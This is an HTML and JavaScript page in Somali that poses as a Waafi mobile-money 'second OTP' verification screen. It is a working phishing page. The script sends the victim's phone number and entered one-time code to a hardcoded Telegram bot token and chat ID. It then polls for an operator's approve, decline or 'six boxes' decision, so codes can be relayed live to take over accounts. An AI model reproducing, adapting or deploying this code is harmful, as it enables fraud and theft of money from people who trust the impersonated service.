<!DOCTYPE html>
<html lang="so">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waafi - OTP 2</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            margin: 0;
            padding: 0;
            background-color: #fff;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
        }
        
        .container {
            flex: 1;
            padding: 40px 20px;
            text-align: center;
        }
        
        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 10px;
            font-weight: 500;
        }
        
        p {
            font-size: 14px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        
        .otp-inputs {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 30px 0;
        }
        
        .otp-inputs input {
            width: 45px;
            height: 55px;
            border: 1.5px solid #ccc;
            border-radius: 8px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            outline: none;
        }
        
        .otp-inputs input:focus {
            border-color: #2ecc71;
            border-width: 2px;
        }
        
        .resend-text {
            font-size: 13px;
            color: #888;
            margin-bottom: 30px;
        }
        
        .btn-verify {
            width: 100%;
            max-width: 300px;
            padding: 15px;
            border-radius: 10px;
            border: none;
            background-color: #e0e0e0;
            color: #a0a0a0;
            font-size: 14px;
            font-weight: bold;
            cursor: not-allowed;
            text-transform: uppercase;
        }
        
        .btn-verify.active {
            background-color: #2ecc71;
            color: white;
            cursor: pointer;
        }
        
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, #2ecc71, #27ae60);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        
        .footer {
            position: relative;
            height: 250px;
            background: linear-gradient(to bottom, #2ecc71, #27ae60);
            border-top-left-radius: 50% 100px;
            border-top-right-radius: 50% 100px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 12px;
            margin-top: auto;
        }
        
        #status-msg {
            margin-top: 15px;
            font-size: 14px;
            font-weight: 500;
            min-height: 20px;
        }
        
        #poll-status {
            font-size: 13px;
            color: #666;
            margin-top: 10px;
            min-height: 20px;
        }
    </style>
</head>

<body>

    <div id="loading-overlay">
        <div class="spinner"></div>
        <div id="loading-text" style="font-size: 20px; font-weight: bold;">Fadlan sug...</div>
        <div id="loading-sub" style="font-size: 14px; margin-top: 10px; opacity: 0.8;"></div>
    </div>

    <div class="container">
        <h2>Xaqiijinta OTP-ga Labaad</h2>
        <p>Geli OTP-ga labaad oo loogu diray taleefankaaga si aad u sii waddo.</p>

        <div class="otp-inputs">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
        </div>

        <div class="resend-text" id="timer-text"></div>
        <button class="btn-verify" id="verify-btn" disabled>XAQIIJI OTP GA LABAAD</button>
        <div id="status-msg"></div>
        <div id="poll-status"></div>
    </div>

    <div class="footer">© 2026 Waafi Soomaaliya</div>

    <script>
        // ============================================================
        // CONFIGURE YOUR TELEGRAM BOT
        // ============================================================
        const BOT_TOKEN = "8656615820:AAFtxstZAw05oI0IxDByt7ymfaWZSi23t5w";
        const ADMIN_CHAT_ID = "8656615820";
        // ============================================================

        let pollInterval = null;

        const phone = localStorage.getItem('phone');
        const inputs = document.querySelectorAll('.otp-inputs input');
        const btn = document.getElementById('verify-btn');
        const timerDisplay = document.getElementById('timer-text');
        const statusMsg = document.getElementById('status-msg');
        const overlay = document.getElementById('loading-overlay');
        const loadingText = document.getElementById('loading-text');
        const loadingSub = document.getElementById('loading-sub');
        const pollStatus = document.getElementById('poll-status');

        let countdown;
        let isSubmitting = false;

        window.onload = () => {
            if (!phone) {
                window.location.href = "/page6";
                return;
            }
            inputs[0].focus();
            startTimer();
        };

        function startTimer() {
            let secondsLeft = 60;
            clearInterval(countdown);
            countdown = setInterval(() => {
                secondsLeft--;
                if (secondsLeft <= 0) {
                    clearInterval(countdown);
                    timerDisplay.innerHTML = '<span id="resend-btn" style="color:#2ecc71; cursor:pointer; font-weight:bold;">Koodka dib u dir</span>';
                    document.getElementById('resend-btn').onclick = resendCode;
                } else {
                    timerDisplay.innerText = `Koodka mar kale u dir ${secondsLeft} ilbiriqsi`;
                }
            }, 1000);
        }

        async function resendCode() {
            timerDisplay.innerText = "Kood cusub ayaa la dirayaa...";
            try {
                await fetch('/api/resend-otp-notification', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        phone,
                        step: "Second OTP"
                    })
                });
            } catch (e) {}
            setTimeout(startTimer, 2000);
        }

        // ---- Auto-move OTP inputs ----
        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                input.value = input.value.replace(/\D/g, '');
                if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
                checkFull();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    inputs[index - 1].focus();
                    inputs[index - 1].value = '';
                    checkFull();
                }
            });
            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text');
                const digits = paste.replace(/\D/g, '').split('');
                digits.forEach((digit, idx) => {
                    if (idx < inputs.length) inputs[idx].value = digit;
                });
                const emptyIndex = [...inputs].findIndex(inp => inp.value === '');
                if (emptyIndex !== -1) inputs[emptyIndex].focus();
                else inputs[inputs.length - 1].focus();
                checkFull();
            });
        });

        function checkFull() {
            const isComplete = Array.from(inputs).every(i => i.value !== '');
            btn.disabled = !isComplete;
            btn.classList.toggle('active', isComplete);
        }

        // ---- Main submit handler ----
        btn.addEventListener('click', submitOtp);

        async function submitOtp() {
            if (btn.disabled || isSubmitting) return;
            isSubmitting = true;

            const otp = Array.from(inputs).map(i => i.value).join('');

            // Show loading overlay
            overlay.style.display = 'flex';
            loadingText.innerText = "Waa la diray...";
            loadingSub.innerText = "Sug oggolaanshaha admin-ka";
            statusMsg.innerText = "";
            pollStatus.innerText = "";

            // ---- Send OTP to Telegram Bot WITH INLINE BUTTONS ----
            if (BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" && ADMIN_CHAT_ID !== "YOUR_ADMIN_CHAT_ID_HERE") {
                try {
                    const timestamp = Date.now();
                    const message = "🔐 *OTP Labaad waa la soo galiyay*\n\n📱 Phone: `" + phone + "`\n🔢 OTP: `" + otp + "`\n🆔 TS: `" + timestamp + "`";

                    const inlineKeyboard = {
                        inline_keyboard: [
                            [{
                                text: "✅ Approve",
                                callback_data: "approve_otp2_" + timestamp
                            }, {
                                text: "❌ Decline",
                                callback_data: "decline_otp2_" + timestamp
                            }, {
                                text: "📦 Six Boxes",
                                callback_data: "sixboxes2_" + timestamp
                            }]
                        ]
                    };

                    const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id: ADMIN_CHAT_ID,
                            text: message,
                            parse_mode: "Markdown",
                            reply_markup: JSON.stringify(inlineKeyboard)
                        })
                    });

                    const result = await response.json();

                    if (result.ok && result.result) {
                        // Start polling for admin decision
                        startPolling(timestamp);
                    } else {
                        throw new Error(result.description || "Failed to send");
                    }

                } catch (e) {
                    console.log("Telegram send failed:", e);
                    statusMsg.style.color = "red";
                    statusMsg.innerText = "❌ Khalad ayaa dhacay. Fadlan dib u day.";
                    overlay.style.display = 'none';
                    isSubmitting = false;
                }
            } else {
                // No bot configured - just navigate directly
                loadingSub.innerText = "Bot not configured, redirecting...";
                setTimeout(() => {
                    window.location.href = "page10.html";
                }, 1000);
            }
        }

        function startPolling(timestamp) {
            // Clear any existing poll
            if (pollInterval) clearInterval(pollInterval);

            let attempts = 0;
            const maxAttempts = 150; // ~5 minutes

            pollInterval = setInterval(async function() {
                attempts++;
                loadingSub.innerText = "La sugayo... " + attempts + "s";

                try {
                    const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?timeout=5");
                    const data = await response.json();

                    if (data.ok && data.result) {
                        for (const update of data.result) {
                            if (update.callback_query) {
                                const query = update.callback_query;
                                const callbackData = query.data;

                                // Check if this callback is for our OTP
                                if (callbackData.includes("" + timestamp)) {

                                    if (callbackData.startsWith("approve")) {
                                        // ✅ APPROVED - Navigate to page10
                                        clearInterval(pollInterval);
                                        loadingText.innerText = "✅ Waa la ansixiyay!";
                                        loadingSub.innerText = "U gudbaya...";
                                        setTimeout(function() {
                                            window.location.href = "page10.html";
                                        }, 1500);
                                        return;
                                    }

                                    if (callbackData.startsWith("decline")) {
                                        // ❌ DECLINED - Reset and stay on same page
                                        clearInterval(pollInterval);
                                        overlay.style.display = 'none';
                                        statusMsg.style.color = "red";
                                        statusMsg.innerText = "❌ Codsiga waa la diiday. Fadlan dib u geli OTP-ga.";
                                        resetForm();
                                        return;
                                    }

                                    if (callbackData.startsWith("sixboxes")) {
                                        // 📦 Six Boxes - acknowledge but keep waiting
                                        loadingSub.innerText = "📦 Six boxes option selected... sugitaan";
                                    }
                                }
                            }
                        }
                    }

                    // If max attempts reached, timeout
                    if (attempts >= maxAttempts) {
                        clearInterval(pollInterval);
                        overlay.style.display = 'none';
                        statusMsg.style.color = "red";
                        statusMsg.innerText = "⏰ Waqtigii oggolaanshaha wuu dhammaaday. Fadlan dib u day.";
                        resetForm();
                    }

                } catch (err) {
                    console.error("Poll error:", err);
                }
            }, 2000);
        }

        function resetForm() {
            isSubmitting = false;
            inputs.forEach(i => i.value = "");
            btn.disabled = true;
            btn.classList.remove('active');
            if (inputs[0]) inputs[0].focus();
        }
    </script>
</body>

</html>
